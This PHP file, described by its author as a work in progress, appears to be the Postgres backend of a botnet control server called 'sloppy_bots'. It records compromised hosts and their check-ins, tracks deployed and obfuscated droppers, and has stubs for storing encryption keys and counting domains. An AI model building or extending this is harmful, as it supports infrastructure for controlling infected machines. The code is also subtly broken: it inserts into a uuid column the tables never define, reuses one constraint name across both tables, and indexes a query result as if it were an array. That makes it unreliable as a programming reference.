<?php
# i am still working this. but will show its intent none the less.


class postgres_checker
{
    public $er;

    function init_conn()
    {
        return pg_connect("host=localhost port=5432 user=postgres dbname=sloppy_bots");
    }

    function createDB()
    {
        try {
            pg_exec($this->init_conn(), "SET AUTOCOMMIT TO ON");
            pg_exec($this->init_conn(), "CREATE DATABASE sloppy_bots");
        } catch (Exception $ex) {
            echo $ex->getMessage() . "\n";
            echo $ex->getLine() . "\n";
            echo $ex->getTraceAsString() . "\n";
        }
        try {
            # for obvious security, removing select role from sloppy_main.
            # will create a function in this class to handle query of records and to return that record.
            pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id SERIAL NOT NULL constraint sloppy_bots_main_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT, uri TEXT, os_flavor TEXT NOT NULL DEFAULT '-', check_in INTEGER NOT NULL default 0)");
            pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id SERIAL NOT NULL constraint sloppy_bots_main_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT, level TEXT, obfuscated TEXT NOT NULL default 'false', check_in INTEGER NOT NULL default 0)");
            pg_exec($this->init_conn(), "GRANT ALL ON ALL TABLES IN SCHEMA public TO postgres");
            return true;
        } catch (Exception $e) {
            echo $e->getMessage() . "\n";
            echo $e->getLine() . "\n";
            echo $e->getTraceAsString() . "\n";
            return false;
        }
    }

    function checkDB()
    {
        # the idea for this, is to check to see if the db returns 1 record. if it does not, we will call create db, or start db.
        try {
            pg_exec($this->init_conn(), 'SELECT id FROM sloppy_bots_main WHERE id IS NOT NULL');
            return true;
        } catch (Exception $ee) {
            $this->createDB();
            return false;
        }
    }

    function getRecord($ip)
    {
        if (!empty($ip) && is_string($ip)) {
            $row = pg_exec($this->init_conn(), sprintf("SELECT rhost FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($ip)));
            if (!empty($row)) {
                return pg_fetch_row($row);
            } else {
                return false;
            }
        }
        return false;
    }

    function insertHost($host, $uri, $osType, $checkIn, $uuid, $action)
    {
        if (!empty($host) && $action === 'add') {
            try {
                pg_exec($this->init_conn(), sprintf("INSERT INTO sloppy_bots_main(rhost, uri, os_flavor, check_in, uuid) VALUES ('%s', '%s', '%s', '%s', '%s')", pg_escape_string($host), pg_escape_string($uri), pg_escape_string($osType), pg_escape_string($checkIn), pg_escape_string($uuid)));
                pg_exec($this->init_conn(), "COMMIT");
                return 1;
            } catch (Exception $exx) {
                echo $exx->getTraceAsString();
                echo $exx->getTrace();
                echo $exx->getMessage();
                echo $exx->getCode();
                return pg_fetch_row(pg_exec($this->init_conn(), sprintf("SELECT uri from sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host))));
            }
        } elseif ($action === 'ci') {
            try {
                $counter = 0;
                $preOPwned = pg_exec($this->init_conn(), sprintf("SELECT id,check_in FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                if (!is_null(pg_fetch_row($preOPwned))) {
                    $counter = $preOPwned[1] + 1;
                } else {
                    $counter = $checkIn;
                }
                pg_exec($this->init_conn(), sprintf("UPDATE sloppy_bots_main SET check_in = '%d' WHERE uuid LIKE '%s'", (int)$counter, pg_escape_string($uuid)));
                pg_exec($this->init_conn(), "COMMIT");
                return 1;
            } catch (Exception $ex2) {
                echo $ex2->getTraceAsString();
                echo $ex2->getTrace();
                echo $ex2->getMessage();
                echo $ex2->getCode();
                return 0;
            }
        } else {
            return 0;
        }
    }

    function insertCreatedDropper(string $xorKey, string $chachaKey, string $aesKey, string $whereWeStored)
    {

    }

    function countUsedDomains(string $dom)
    {

    }
}